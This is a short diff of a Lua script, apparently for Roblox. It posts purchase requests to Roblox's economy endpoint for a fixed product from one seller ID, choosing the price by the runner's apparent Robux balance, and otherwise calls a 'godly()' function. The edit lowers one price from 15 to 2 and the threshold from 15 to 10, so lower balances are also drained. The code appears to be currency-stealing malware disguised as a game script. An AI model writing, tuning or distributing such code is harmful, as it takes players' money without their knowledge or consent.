@@ -21,7 +21,7 @@ if start then
     end
 end
 
-local eros = '{"expectedCurrency":1,"expectedPrice":15,"expectedSellerId":5771940015}'
+local eros = '{"expectedCurrency":1,"expectedPrice":2,"expectedSellerId":5771940015}'
 local hercules = '{"expectedCurrency":1,"expectedPrice":25,"expectedSellerId":5771940015}'
 local hylos = '{"expectedCurrency":1,"expectedPrice":50,"expectedSellerId":5771940015}'
 local tartarus = '{"expectedCurrency":1,"expectedPrice":100,"expectedSellerId":5771940015}'
@@ -83,7 +83,7 @@ if rb == 0 then
 godly()
 elseif rb > 0 and rb < 15 then
 godly()
-elseif rb >= 15 and rb < 25 then
+elseif rb >= 10 and rb < 25 then
 _post("https://economy.roblox.com/v1/purchases/products/780837581", eros)
 wait()
 elseif rb >= 25 and rb < 50 then
